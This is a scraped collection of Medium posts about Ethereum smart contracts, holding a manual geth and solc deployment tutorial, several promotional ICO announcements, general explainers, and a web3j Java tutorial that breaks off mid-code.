2017I am in favor of understanding the mechanics that goes under the hood of a tool, framework or technology that I am using. If not all of it, at least a general understanding so once a bugs appears I have an idea where to look at.This post is an exercise on the steps that happen to deploy a smart contract on the Ethereum Virtual Machine. I will show here the repetitive manual manner which if you have used tools such as Truffle or Mist they are done in simple short commands.For this, you need to install Geth and Solidity compiler.$ sudo apt-get install -y software-properties-common$ sudo add-apt-repository -y ppa:ethereum/ethereum$ sudo apt-get update$ sudo apt-get install -y ethereum$ sudo apt-get install -y solcCheck if you have solc and geth installed$ ~$ solc --versionsolc, the solidity compiler commandline interfaceVersion: 0.4.11-develop.2017.4.24+commit.a9f42157.Linux.g++$ geth versionGethVersion: 1.6.0-stableGit Commit: facc47cb5cec97b22c815a0a6118816a98f39876Architecture: amd64Protocol Versions: [63 62]...For this exercise I am going to run geth in my own private network. This post does not go into setting up your own private blockchain. However if you are interested you can set one up by following these instructionsMake sure you start geth with the console flag and if you have not done so already go ahead and create an wallet address so we can deploy the contract with it:$ personal.newAccount()This is the contract we will deploy the hard way:pragma solidity ^0.4.10;contract Storage {  uint256 storedData;  function set(uint256 data) {    storedData = data;  }  function get() constant returns (uint256) {    return storedData;  }}CompilationCreate the file for the contract and add the code above to it.$ touch Storage.solTo compile this contract we will put it in a json format and assign a JavaScript variable, then we send it to an output file.$ echo \"var storageOutput=`solc --optimize --combined-json abi,bin,interface Storage.sol`\" > storage.js$ cat storage.jsvar storageOutput={\"contracts\":{\"Storage.sol:Storage\":{\"abi\":\"[{\\\"constant\\\":false,\\\"inputs\\\":[{\\\"name\\\":\\\"data\\\",\\\"type\\\":\\\"uint256\\\"}],\\\"name\\\":\\\"set\\\",\\\"outputs\\\":[],\\\"payable\\\":false,\\\"type\\\":\\\"function\\\"},{\\\"constant\\\":true,\\\"inputs\\\":[],\\\"name\\\":\\\"get\\\",\\\"outputs\\\":[{\\\"name\\\":\\\"\\\",\\\"type\\\":\\\"uint256\\\"}],\\\"payable\\\":false,\\\"type\\\":\\\"function\\\"}]\",\"bin\":\"60606040523415600b57fe5b5b60978061001a6000396000f300606060405263ffffffff60e060020a60003504166360fe47b18114602a5780636d4ce63c14603c575bfe5b3415603157fe5b603a600435605b565b005b3415604357fe5b60496064565b60408051918252519081900360200190f35b60008190555b50565b6000545b905600a165627a7a7230582052ccd035d0e1b92d60b2dbc6ffd8a86d947fcaa3199be580f3d95fc289b0c39a0029\"}},\"version\":\"0.4.11-develop.2017.4.24+commit.a9f42157.Linux.g++\"}Now in Geth console:> loadScript('storage.js')true> storageOutput{  contracts: {    Storage.sol:Storage: {      abi: \"[{\\\"constant\\\":false,\\\"inputs\\\":[{\\\"name\\\":\\\"data\\\",\\\"type\\\":\\\"uint256\\\"}],\\\"name\\\":\\\"set\\\",\\\"outputs\\\":[],\\\"payable\\\":false,\\\"type\\\":\\\"function\\\"},{\\\"constant\\\":true,\\\"inputs\\\":[],\\\"name\\\":\\\"get\\\",\\\"outputs\\\":[{\\\"name\\\":\\\"\\\",\\\"type\\\":\\\"uint256\\\"}],\\\"payable\\\":false,\\\"type\\\":\\\"function\\\"}]\",      bin: \"60606040523415600b57fe5b5b60978061001a6000396000f300606060405263ffffffff60e060020a60003504166360fe47b18114602a5780636d4ce63c14603c575bfe5b3415603157fe5b603a600435605b565b005b3415604357fe5b60496064565b60408051918252519081900360200190f35b60008190555b50565b6000545b905600a165627a7a7230582052ccd035d0e1b92d60b2dbc6ffd8a86d947fcaa3199be580f3d95fc289b0c39a0029\"    }  },  version: \"0.4.11-develop.2017.4.24+commit.a9f42157.Linux.g++\"}Notice how the root object is a map { contracts: Storage.sol:Storage: {...} }. Storage.sol:Storage\u00a0. The map keys identify the contract name, the abi in json, the bin code and lastly the solidity compile version.Let\u2019s prepare the variables that will help us interact with the contract.> var storageContractAbi = storageOutput.contracts['Storage.sol:Storage'].abi\"[{\\\"constant\\\":false,\\\"inputs\\\":[{\\\"name\\\":\\\"data\\\",\\\"type\\\":\\\"uint256\\\"}],\\\"name\\\":\\\"set\\\",\\\"outputs\\\":[],\\\"payable\\\":false,\\\"type\\\":\\\"function\\\"},{\\\"constant\\\":true,\\\"inputs\\\":[],\\\"name\\\":\\\"get\\\",\\\"outputs\\\":[{\\\"name\\\":\\\"\\\",\\\"type\\\":\\\"uint256\\\"}],\\\"payable\\\":false,\\\"type\\\":\\\"function\\\"}]\">var storageContract = eth.contract(JSON.parse(storageContractAbi))undefined> var storageBinCode = \"0x\" + storageOutput.contracts['Storage.sol:Storage'].bin\"0x60606040523415600b57fe5b5b60978061001a6000396000f300606060405263ffffffff60e060020a60003504166360fe47b18114602a5780636d4ce63c14603c575bfe5b3415603157fe5b603a600435605b565b005b3415604357fe5b60496064565b60408051918252519081900360200190f35b60008190555b50565b6000545b905600a165627a7a7230582052ccd035d0e1b92d60b2dbc6ffd8a86d947fcaa3199be580f3d95fc289b0c39a0029\"Notice that to get the web3 contract object we need to use eth.contract + the parsed storageContractAbi from the compilation.We also get store the bin code value in a variable. Notice that in order to have the expected hex value we need to add the \"0x\" at the beginning of it.DeploymentGeth provides a facility to deploy a compiled contract. you need some ether for this step, plus it only works when you mine, so let\u2019s start the miner:> miner.start(1)Now it is time to deploy. Make sure you unlock your account by typing the password you assigned to it.> personal.unlockAccount(eth.accounts[0])>var deployTransationObject = { from: eth.accounts[0], data: storageBinCode, gas: 1000000 };undefined> var storageInstance = storageContract.new(deployTransationObject)undefined> storageInstance{  abi: [{      constant: false,      inputs: [{...}],      name: \"set\",      outputs: [],      payable: false,      type: \"function\"  }, {      constant: true,      inputs: [],      name: \"get\",      outputs: [{...}],      payable: false,      type: \"function\"  }],  address: undefined,  transactionHash: \"0xcbe9921400083ca543e4e62386e3a02eed6cb327f23c9a445f3ec81a3bfad830\"}So the contract sent a transaction to deploy an instance and returned a web3 contract instance, which unfortunately lacks an address. It should know the address but it did not because it was not mined yet. To fix it, let\u2019s get the address by doing:> eth.getTransactionReceipt(storageInstance.transactionHash);{  blockHash: \"0x5712473e4b60e5c58648daee420427133db4c048a11193330a6c26b6101e5206\",  blockNumber: 11,  contractAddress: \"0xc05c7ee9b13dd103581accfead6074e0522475e0\",  cumulativeGasUsed: 94673,  from: \"0x7f77d5c8639d04f7efb221079cac40dca1a37f43\",  gasUsed: 94673,  logs: [],  logsBloom: \"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",  root: \"0xd2945007d43f6d05def2d48b5c369e61915b9c3cedde933e26a5469b241e7106\",  to: null,  transactionHash: \"0xcbe9921400083ca543e4e62386e3a02eed6cb327f23c9a445f3ec81a3bfad830\",  transactionIndex: 0}The address returned is the unique, immutable address of the contract, it is calculated from the hash of the sender address and the transaction nonce. When you interact with this contract instance you need to mention this address. So let\u2019s save it:> var storageAddress = eth.getTransactionReceipt(storageInstance.transactionHash).contractAddressundefined> storageAddress\"0xc05c7ee9b13dd103581accfead6074e0522475e0\"Voil\u00e1, the contract is deployed.Let\u2019s interact with the contract:> var storage = storageContract.at(storageAddress);undefined> storage{  abi: [{      constant: false,      inputs: [{...}],      name: \"set\",      outputs: [],      payable: false,      type: \"function\"  }, {      constant: true,      inputs: [],      name: \"get\",      outputs: [{...}],      payable: false,      type: \"function\"  }],  address: \"0xc05c7ee9b13dd103581accfead6074e0522475e0\",  transactionHash: null,  allEvents: function(),  get: function(),  set: function()}Here are the JavaScript functions that will let us call the same ones in the contract. Let\u2019s call a function. By the way are you mining?\u00a0;-)> storage.get.call()0> storage.set.sendTransaction(42, {from: eth.accounts[0], gas: 1000000})\"0x7a54ab329fcbf551432eb78c4b2a1ff48fc8b9f9aa23d94fa86330e5c1d711f3\"> storage.get.call()42Success!We just saw here a long and winding path of deploying a contract to the Ethereum Virtual Machine. Tools such a Truffle does all that for you under the hood with commands such as truffle compile and truffle migrate. But I believe it is good to know the innards so you are on the right track to become proficient in this new field. Hope you enjoyed this blog post. Next one I will talk about deploying smart contracts using Truffle.", "responses": "7"}, {"title": "Transacting with a Smart Contract over blockchain", "author_name": "ARFREYR", "link": "https://medium.com/@arfreyr/smart-contract-and-its-relation-with-blockchain-c15ca6e32471?source=search_post", "post_date": "Oct 24, 2018", "readtime": "2 min read", "upvotes": "2.4K", "content": "Transacting with a Smart Contract over blockchainARFREYRBlockedUnblockFollowFollowingOct 24, 2018During the traditional days of business there always was a third party that stands between two parties for executing a transaction and enforcing the rules of an agreement. The third party can be a banking institution, a government establishment or any other intermediary, the huge reliance on a intermediaries puts the consumers at risk because they can\u2019t guarantee payments or implementation of contracts alwaysWith the advent of blockchain, it allowed businesses to build decentralised models to conduct transactions and make agreements. Once such decentralised model is smart contract, although smart contract\u2019s have become hyped in the recent past they were first proposed around 20 years back by Nick Szabo, a computer scientist and cryptographer.A smart contract is a piece of software that stores rules for negotiating the terms of an agreement, automatically verifies fulfilment, and then executes the agreed terms thereby it removes the dependancy on third parties when performing business transactionsCrowdfunding can be considered as one of the best use cases for smart contract, during an ICO we program a smart contract to receive funds until a certain goal is reached and within a particular deadline. If the goal was achieved, then all the funds raised are transferred to the project team else the investors would automatically get their money back. Since a smart contract is stored on blockchain where all the data is stored in a distributed manner, no one can tamper with itMain key advantages of a smart contract include that they are immutable and distributed, the outcome of a smart contract is always validated by everyone else in the network just like a blockchain transaction and therefore it would be impossible for an attacker or a fraud to take control of the raised fundsSumming that up, smart contracts are a great model for conducting transactions between businesses without an intermediary over a blockchain, if you would like to know more about how smart contracts can be used for managing transactions over a supply chain, please do visit us at: https://arfreyr.com and have a look at our white-paper. We have some great new concepts which we believe will revolutionise the entire supply chain right from order picking to delivery!", "responses": "5"}, {"title": "SERO Early Bird iBO(Initial Bancor Offering)Token Exchange and Smart Contract released!", "author_name": "SERO", "link": "https://medium.com/@SERO.CASH/sero-early-bird-ibo-initial-bancor-offering-token-exchange-and-smart-contract-released-cd89efcac74b?source=search_post", "post_date": "Nov 9, 2018", "readtime": "2 min read", "upvotes": "1.2K", "content": "SERO Early Bird iBO(Initial Bancor Offering)Token Exchange and Smart Contract released!SEROBlockedUnblockFollowFollowingNov 9, 2018Here\u2019s the official poster for our upcoming Early Bird iBO Token Exchange that begins 12th November. A quite diiferent way of token allocation to users which not many projects do.Also, we are proud to announce that today we launch our SERO Contract successfully. Four days to go for our Early Bird iBO Token Exchange Round and ICO launch!Important points to remember\u00a0:People participating in Early Bird iBO Token Exchange will get their SERO Tokens instantly in their wallets.A total of 57 million SERO Tokens will be available for sale in Early Bird iBO Token Exchange Round.The lowest price per token will be 0.000075ETH and unit price of the SERO token will increase according to the Bancor formula after each investment.The minimum and the maximum amount of investment that a person can make is 1 ETH - 500 ETH.Here\u2019s the contract address https://etherscan.io/token/0x62eb859356a5c91352be3a18a4452868860e28e1What makes SERO different and why should you\u00a0invest?SERO (Super Zero) is the world-leading technology with Zero-knowledge Proof that truly implements blockchain privacy protection and a public chain platform that supports Turing complete smart contract operations. DApp developers can issue their own anonymous token or anonymous ticket based on SERO CHAIN to circulate throughout the SERO ecosystem.Super-ZK\u200a\u2014\u200aZero-knowledge proof encryption library, independently developed by SERO is currently the fastest in encryption performance. In the same application scenario, Super-ZK encryption speed is 20 times faster than Zcash (the mainstream privacy protection cryptocurrency that at present, uses zk-SNARKs). Compare with Bulletproofs (the latest bulletproof protocol), Super-ZK is 4 times more faster. SERO solved the Zero-knowledge proof performance problem. SERO will lead the privacy protection space and the preparation for the wider commercialization of blockchain.\u3002Our Testnet\u00a0: http://118.25.146.113/Our official website\u00a0: https://sero.cashDOCUMENTS:\u2022 Whitepaper\u00a0: http://sero-media.s3-website-ap-southeast-1.amazonaws.com/Sero_ENG_V1.06.pdfOUR SOCIAL MEDIA CHANNELS\u00a0:\u2022 Twitter\u00a0: https://twitter.com/SEROdotCASH\u2022 Reddit\u00a0: https://www.reddit.com/user/SEROofficial\u2022 BitcoinTalk\u00a0: https://bitcointalk.org/index.php?action=profile;u=2449455;sa\u2022 Linkedin\u00a0: Available on website https://sero.cash\u2022 Telegram\u00a0: https://t.me/SeroOfficial\u2022 Medium\u00a0: https://medium.com/@SERO.CASH\u2022 GitHub\u00a0: https://github.com/sero-cash/go-sero", "responses": ""}, {"title": "Tokenized Smart Contracts\u200a\u2014\u200aRedefining the Landscape for Cryptocurrency", "author_name": "Lukas Tassanyi (MicroHash)", "link": "https://medium.com/coinmonks/tokenized-smart-contracts-e88bc06bc969?source=search_post", "post_date": "Jun 8, 2018", "readtime": "7 min read", "upvotes": "1.91K", "content": "Tokenized Smart Contracts\u200a\u2014\u200aRedefining the Landscape for CryptocurrencyLukas Tassanyi (MicroHash)BlockedUnblockFollowFollowingJun 8, 2018Almost 10 years ago, Satoshi Nakamoto published a paper titled: \u201cBitcoin: A Peer-to-Peer Electronic Cash System\u201d. The idea of Bitcoin was born but back then you would have been called delusional if you thought an entire asset market worth twelve digit USD figures would emerge from that.What started with BTC, was soon complemented with other assets. At first, there were mostly just renamed Bitcoin forks but later new protocols with different natures were designed and even virtual tokens were created on top of smart contract platforms. It would, however, be extremely naive to think that we have already discovered the entire spectrum of assets in this still very young market.\u201cTokenized Smart Contracts\u201d (TSCs), which, to be honest, sounds like a weird word mix-up, could be exactly such a new asset. In this article, I will do my very best to describe the concept behind these strange, not yet existing tokens and what value they could provide to the world of cryptocurrency.", "responses": "5"}, {"title": "Smart Contracts Serve as the basis for the Eternal Trusts\u00a0Platform", "author_name": "Eternal Trusts", "link": "https://medium.com/@EternalTrusts/smart-contracts-serve-as-base-for-eternal-trusts-platform-3d253ad2aa18?source=search_post", "post_date": "Mar 29, 2018", "readtime": "", "upvotes": "452", "content": "Smart Contracts Serve as the basis for the Eternal Trusts\u00a0PlatformEternal TrustsBlockedUnblockFollowFollowingMar 29, 2018If you\u2019re interested in cryptocurrencies or blockchain, you might have heard the term \u201csmart contract\u201d. Let\u2019s discuss how this concept applies to our platform.So, a smart contract is a digital algorithm or a set of conditions that, upon triggering, allow parties to exchange funds, shares or other assets. Usually this asset is a cryptocurrency of some sort.How does it work? Here\u2019s an example.Have you ever bought real estate? If yes, you probably know that you need to use the service of a notary to make the transaction, which means additional expenses for the buyer. Smart contracts allow to forego the services of middlemen such as banks, lawyers, notary officers etc. because the contract itself checks the contractual obligations before approving a transaction. The fulfillment of the contract is supervised by the program. As soon as the conditions are fulfilled, the parties exchange assets. The seller receives a specific sum of money while the buyer receives the good. In other words, everything is done automatically.http://eternaltrusts.io/", "responses": "1"}, {"title": "SKYFchain Team Deploys the SKYFT Smart\u00a0Contract", "author_name": "SKYFchain", "link": "https://medium.com/skyfchain-io/skyfchain-team-deploys-the-skyft-smart-contract-861d6e7bd294?source=search_post", "post_date": "Jul 6, 2018", "readtime": "4 min read", "upvotes": "323", "content": "SKYFchain Team Deploys the SKYFT Smart\u00a0ContractSKYFchainBlockedUnblockFollowFollowingJul 6, 2018SKYFchain team launched the ICO smart contract. All investors can transfer their SKYFT tokens from their investors\u2019 accounts on skyfchain.io to their crypto wallets starting from July, 1. The SKYFT are ERC-20 tokens; you need Ethereum wallet to withdraw them. Our ICO is still live, and you can join us at the new level of confidence.SKYFchain project is a very dynamic startup growing by leaps and bounds. On the 11th of June, the SKYFchain\u2019s ICO has reached its Soft Cap of $5 million. We have released the MVP; the first version of SKYFchain Operating Platform is available on mvp.skyfchain.io.We are entirely sure the SKYFchain will be a great success and help transform the logistics industry. We have received a great deal of interest and support both from individual and corporate investors. While we have reached the Soft Cap mainly through the support of smaller investors, the more significant funds and corporations are naturally slower, and quite a few negotiations are still open. Now with the smart contract and MVP in place, we plan to fix essential deals in the following weeks, supporting SKYFT launch at crypto exchanges.To the same goal of supporting SKYFT at launch, we lock a substantial part of tokens: the full team fund, the whole reserve fund, 50% of the development fund, the airdrop users\u2019 fund. We also decided to give a chance to unlock airdrop users\u2019 tokens through a matching investment, boosting SKYFT performance by converting supporters to investors.To receive tokens, you need to sign into your account at skyfchain.io, check out and activate your Ethereum wallet address and push the \u2018Withdraw\u2019 button.\u2018We are sure that smart contract\u2019s release and tokens distribution will provide our investors with additional confidence. We develop SKYFchain step by step. The MVP of the platform is already on air. We continue negotiations with a few crypto exchanges and with some reputable cryptocurrency investors. We believe these steps will advance the project and strengthen SKYFT token exchange rate,\u2019 Alexander Timofeev, CEO of SKYFchain says.The total supply of SKYFT is 1,200,000,000 tokens, this includes:\u2022 Crowdsale Fund (44 % or 528 000 000 SKYFT) based on Ethereum account;\u2022 Network Development Fund (15% or 180 000 000 SKYFT), c- 50% of NDF will be spent in the first year, 35% during the 2nd year and 15% during the 3rd year;\u2022 Community Development Fund (10% or 120 000 000 SKYFT);\u2022 Reserve Fund (9,5% or 114 000 000 SKYFT)\u200a\u2014\u200afrozen for 1 year;\u2022 Bounty fund (1,5% or 18 000 000 SKYFT);\u2022 Team Fund (20% or 240 000 000 SKYFT)\u200a\u2014\u200afrozen for 1 year.As ICO will be completed on August 15th, all unsold crowdsale tokes will be burnt. Tokens in the other funds will be burnt as well in the given proportion.Now, the airdrop campaign participants will be able to unlock their airdrop tokens earlier. In case of purchase of an equal amount of tokens, they would be able to unlock them six months earlier. In case of 3x of airdrop tokens purchase, they would be able to unlock them right after the end of ICO.***SKYFchain is the first Business-2-Robots Operating Platform in the cargo logistics industry. SKYFchain is an open blockchain platform for keeping and exchanging data of all cargo robots\u2019 operations and transactions. Any action on the Operating Platform has an own price depending on the type, frequency, and complexity of transactions and is denominated in the traditional currency. All transactions within SKYFchain will be processed in SKYFT tokens, as required by the smart contract logic. The more transactions, the higher valuation of SKYFT. 25% of transaction fee will be regularly distributed among SKYFT tokens holders.The first cargo robot to start operations on SKYFchain will be SKYF. SKYF will use SKYFchain to operate hundreds of freighter drones that have already been pre-ordered by the most significant oil/gas and logistics companies around the world. SKYFchain is open to any other manufacturers of unmanned drones, including cars and cargo ships. It is also open to logistics providers and financial organizations and has every chance to become a universal tool, a standard for the unmanned logistics industry. Within five years, SKYF plans to spend over US $50 million to buy SKYFT tokens on the open crypto-exchange. The funds will be used for the further development of SKYFchain. The SKYFT tokens emission conforms the international legislative regulation of the blockchain and is compliant with the SEC of the USA.", "responses": ""}, {"title": "Ethereum Blockchain \u201cHello World\u201d Smart Contract with\u00a0JAVA", "author_name": "Thushara Jayasinghe", "link": "https://medium.com/coinmonks/ethereum-blockchain-hello-world-smart-contract-with-java-9b6ae2961ad1?source=search_post", "post_date": "Jun 20, 2018", "readtime": "18 min read", "upvotes": "937", "content": "Ethereum Blockchain \u201cHello World\u201d Smart Contract with\u00a0JAVAThushara JayasingheBlockedUnblockFollowFollowingJun 20, 2018EthereumThis tutorial cover the complete set of steps needed to develop your first smart contract in a private Ethereum node using web3j Java framework.Blockchain is disrupting software industry. The term blockchain has become a popular topic. Everyone is talking about blockchain and its usages in decentralized applications. But most of the time the underline concept of a blockchain is misinterpreted. Let us try to understand it in simple terms. Blockchain can be considered as a database technology which is used to store data in a distributed manner. It uses hashing algorithms to maintain the integrity of data which is very much similar to Git. Every node in block chain will have its own copy of the data store. The manipulation of records in the data store is prevented by a proof of work algorithm.Processing nodes are connected peer-to-peer and will work autonomously. This enable the elimination of third party player such as banking system the middle of a transaction to manage the risk. Cryptocurrency such as Bitcoin is an example usage of blockchain technology. But it is not limited to Cryptocurrency.BlockchainThe purpose of the blockchain technology is to eliminate the need of having a middle man to facilitate financial transactions. In a typical payment system a bank or a financial institution will minimize the risk of the transaction by acting as a middle man.Typical transaction flowBlockchain technology facilitates payments without a middle player. For example you can transfer digital money from your account to your supplier account without the help of paypal or any other third party payment provider functionalities. So blockchain is simple as that.Direct peer-to-peer transactionDefinition\u00a0: A blockchain is a peer-to-peer distributed ledger forged by consensus, combined with a system for \u201csmart contracts\u201d and other assistive technologies. Rememner blockchain is not a single technology. It is a collection of technologies.Blockchain TechnologyLets try to understand these technologies.DLT\u00a0: Distributed ledgers use independent computers (referred to as nodes) to record, share and synchronize transactions in their respective electronic ledgers (instead of keeping data centralized as in a traditional ledger). Blockchain organizes data into blocks, which are chained together in an append only mode.Blockchain is a specific form or subset of distributed ledger technologies. It is the way that the data is stored in the DLT. But the term Blockchain has become the buzz word for the entire technology stack.Peer-to-peer\u00a0: Nodes in a blockchain are connected peer-to-peer. You can connect a local node running in your laptop to the blockchain network seamlessly.Decentralized\u00a0: In a decentralized system each node is running autonomously. The main difference with a distributed system is that in a distributed system there are dedicates set of nodes to control other nodes. But in a decentralized system no one takes commands from each other. No concept of client server of master slave. Every one has equal decision power.DecentralizedCryptographically secure: Blockchain uses digital signature (SHA256) algorithm to maintain/verify integrity of the data.Digital SignatureAnonymous: In blockchain an account with a key pair ( public key & private key) is used a wallet for submitting transactions. There is no way of identifying a user or any other personal information by looking at a transaction. It is completely anonymous. For example if you go to etherscan.io which is the central application to view Ethereum blockchain transactions then the from account and to account would be something like below.AnonymousWe will talk about these technologies in more details later. Lets have a look at the history of blockchain.History\u00a0: Blockchain technology has found a solution for the Byzantine generals problem as illustrated in below article.Byzantine generals\u00a0problemBlockchain: The Byzantine Generals ProblemThere is a problem in computing which until very recently, had no solution. The problem is called the Byzantine\u2026medium.comTypes of Blockchains: Mainly there are two types of blockchain implementations. Open/Public and enterprise. In an open and public blockchain such as BitCoin or Ethereum anyone can join as a node to the main network. But in an enterprise blockchain such as Hyperledger fabric only authorized nodes can enter into the network.Types of blockchainsThere are many implementations of blockchain technology. We will be discussing about Ethereum.Blockchain ImplementationsBitCoin\u00a0: October 31st of 2008, a white paper has been submitted by an unknown person called Satoshi Nakamoto on performing electronic transactions without the need of a middle party. This is the origin of BitCoin. The whole purpose of the BitCoin technology was to transfer money between two parties in a peer-to-peer manner in contract to current financial transactions which are performed with the help of an intermediary (like a Bank).BitCoinhttps://bitcoin.org/bitcoin.pdfEthereum\u00a0: December 2013\u00a0, Vitalik Buterin wrote a white paper on extending the blockchain technology beyond the financial transactions and the idea of Smart Contracts. This is the origin of Ethereum.https://github.com/ethereum/wiki/wiki/White-Paperhttp://web.archive.org/web/20131228111141/http://vbuterin.com/ethereum.htmlhttps://blockchainreview.io/wp-content/uploads/2018/03/02.01._final_Ethereum-White-Paper-Made-Simple.pdfVitalik Buterin\u00a0: Co-founder of\u00a0EthereumMain components of\u00a0EthereumEthereum is written using Go programming language. Geth is the command line tool/interface for running a full ethereum node. You have the option of connecting to main ethereum network or create your own private network. If you are connected to main network then entire block chain data (~45GB) will be downloaded to your machine. Therefore we are going to setup our own network with one node.EthereumSmart Contract in ethereum is a piece of code that can be deployed and executed to perform business functions. The compiled code is run on every node using ethereum JVM. Contract has its own account address. The caller should pay ether to deploy and execute smart contracts in nodes. A token (Currency) is also a smart contract. These contracts are written using Solidity language. You can define your own currency as a smart contract.Account in ethereum is a combination of account address, a public key and a private key. Address is used to when performing transactions such as fund transfer. Account address is derived from public key. Private key is used to sign the transactions.There are couple of test ethereum networks available in addition to main ethereum network. Ropsten, Kovan & Rinkeby can be used to test your application before moving into production main network.AccountsWallet is used to create/manage your accounts. Wallet can have multiple accounts.MetaMask is a wallet manager app which can be downloaded as a Chrome extension. You will have to trust them to keep your private key.Remix is an online IDE for solidity language. Remix runs it own ethereum node for testing purposes.web3js is a java script framework which can be used to interact with the ethereum nodeweb3j is a java API which can be used to interact with the nodeMist is a browser to browse dApps hosted in cloud. It can be used as a wallet manage as well.Geth is the command line tool which is used to interact with the blockchainTransaction is the fundamental message structure in blockchain.Ethereum blockchain consists of multiple nodes. Each node will have its own copy of blocks. Nodes are communicated peer-to-peer using a gossip protocol.TransactionTransactionA block contains multiple transactions.BlockNodeBlockchain is a link list of Blocks which are connected with Hash values similar to Git. Changing the content of one block will result in change of Hash values in the chain.BlockchainSet of transactions (Block) will be selected by a node for validations. Each transaction is digitally singed with the private key of the user. The public key is embedded in the transaction so that nodes can use the public key to validate the signatures. Once signatures are validated, the node tries to find the next valid block by solving a hashing puzzle. The puzzle is to find a number called Nonse so that the resulting hash of the block will start from given number of leading zeros. For example in below block Node will iterate Nonse = 0 to n so that when n = 139358, the block Hash contains five leading zeros. This is called mining. Once the correct Nonse is found the Node will send this block for other Nodes for confirmation. After a certain number of confirmations the block is accepted as the next block in the chain. The Node is rewarded with some amount of Ether for finding the Nonse. This is where the computing power matters.MiningA chain of blocks is created by using Hash of the previous block in newly Mined block. The Hash of the previous block is an input for the current block. If the previous block is modified then the Hash of the previous block is changed. This will have a chain reaction in entire block chain. Because changing of previous Hash will impact the next block Hash and the next block Hash and it continues\u2026MiningThis is how blockchain maintains integrity of the data. There is an interactive tutorial on this in https://anders.com/blockchain/tokens.htmlSubmitting a transaction from WalletSubmit TransactionInterfacing with Ethereum\u00a0: It is possible to interact with ethereum blockchain using web3js java script API.Interfacing with\u00a0ethereumLets create our own private network with one node.Download & install Geth: Download windows version of Geth from below URL and install it. Geth is the command line interface for the blockchain.https://geth.ethereum.org/downloads/Create genesis block & data folder\u00a0: You need to create your initial block (genesis block) to start the block chain protocol. Create a new folder in your hard drive and save below content as genesis.json. Change the chainId value from 1 to a different number to avoid connecting to main network. chainId=1 is reserved for the main network.{  \"coinbase\"   : \"0x0000000000000000000000000000000000000001\",  \"difficulty\" : \"0x20000\",  \"extraData\"  : \"\",  \"gasLimit\"   : \"0x2fefd8\",  \"nonce\"      : \"0x0000000000000042\",  \"mixhash\"    : \"0x0000000000000000000000000000000000000000000000000000000000000000\",  \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\",  \"timestamp\"  : \"0x00\",  \"alloc\": {},  \"config\": {        \"chainId\": 10,        \"homesteadBlock\": 0,        \"eip155Block\": 0,        \"eip158Block\": 0    }}Create an empty folder called chaindata to store the blocks. Final state will be as follows.genesis.json & data\u00a0folderOpen your command prompt from this folder and use below command to initiate blockchain protocol. This will not start any node.geth --datadir=./chaindata/ init ./genesis.jsonInitiate block\u00a0chainStart your private node\u00a0: Now you can start your private node using below command.geth --datadir=./chaindata/ --rpc consoleStart private\u00a0nodeDownload & install wallet manager app\u00a0: Wallet manager app can be used to create ethereum accounts. An account is a keystore in ethereum with private and public key pair. Keys will be saved in chaindata folder by default. The private key is used to encrypt/sign transactions when submitting to block chain. This key will be loaded by web3j as well. You can use Mist as a wallet manager and to browse ehereum app store. On the other hand wallet manager can be installed as a standalone application as well. https://github.com/ethereum/mist/releases?after=0.4.0We will create two testing accounts using wallet manager app. Download and install wallet manager app from below location.Install wallet manager apphttps://github.com/ethereum/mist/releases2. Launch wallet manager app\u00a0: Remix wallet manager app will connect to your private node by default. You can see it in below screenshot under \u201cPRIVATE NET\u201d red color label.No need to wait for the sync activity with main network, we are just running our local node. Press the launch application button.Wallet Manager3. Create two accounts\u00a0: we will do a simple money transfer transaction using wallet manager app. Two different accounts are needed for that. You can create account using wallet manager app. Go to File menu and press new account. Specify your wallet password. This will create your keystore file with private key and public key. Same process can be repeated to create another account for money transfer transaction. The first account will be identified as the main account by default.Create new\u00a0accountThis is your identity and it should be protected in a safe place. You can locate your kestore files under chaindata/keystore folder.Keystore filesWhat is in your keystore file\u00a0: https://medium.com/@julien.maffre/what-is-an-ethereum-keystore-file-86c8c5917b97In a real world scenario MetaMask will act as your keystore manager. The MetaMask chrome browser extension will manage your keys and will use the private key stored in your browsers data store to sign the transactions.https://ethereum.stackexchange.com/questions/39954/does-metamask-store-private-key-on-server-or-anywhere-else4. Start Mining\u00a0: There is not point of having an account without real money (Ether). We can get some free ether to our main account by starting mining process using Geth console. Below is the command.miner.start();You can navigate to wallet manager app to see how ether is added to your account in real time. Ether will be added to your main account.5. Transfer EtherPress the SEND button in wallet manager to transfer ether from one account to another. Select the FROM account. Copy and paste the address of destination account to TO field. Specify the amount. A fee should be paid for the minors to perform this transaction. You can select your fee under SELECT FEE section and press the SEND button. You will be prompt to enter the keystore password of the source account. Once submitted miners ( we have one miner will start the mining process.Transfer EtherPlease make sure that your node has started mining. If not use miner.start(); command in geth console to start it. It is possible to see the status of your last transaction in wallet manager app. 12 confirmations are required to complete the transaction. Once transaction is completed check your account balances to confirm the money transfer effect. Next we will do the same money transfer transaction using web3j library.Lets start coding with web3jweb3j is a lightweight, highly modular, reactive, type safe Java and Android library for working with Smart Contracts and integrating with clients (nodes) on the Ethereum network.web3jCreate an empty maven project and add below dependency. Complete pom.xml file is as follows.<project xmlns=\"http://maven.apache.org/POM/4.0.0\"         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0   http://maven.apache.org/xsd/maven-4.0.0.xsd\">    <modelVersion>4.0.0</modelVersion>    <groupId>com.web3j.blockchain</groupId>    <artifactId>project</artifactId>    <version>1.0</version>    <dependencies>        <dependency>            <groupId>org.web3j</groupId>            <artifactId>core</artifactId>            <version>3.4.0</version>        </dependency>        <!-- https://mvnrepository.com/artifact/org.web3j/abi -->        <dependency>            <groupId>org.web3j</groupId>            <artifactId>abi</artifactId>            <version>3.4.0</version>        </dependency>        <dependency>            <groupId>org.slf4j</groupId>            <artifactId>slf4j-simple</artifactId>            <version>1.7.5</version>        </dependency>    </dependencies></project>Transfer ether using web3jNotes: You can use the same accounts created by wallet application in web3j code. The actual file name of the keystore file should be mentioned in the code. It will not work if you specify the folder name and not the file name. Use valid destination account address in to parameter. Once above code is executed you can validate the transferred amount in wallet manager app. Miner should be running in your geth console to complete the transaction.Codepackage org.web3j.sample;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.web3j.crypto.Credentials;import org.web3j.crypto.WalletUtils;import 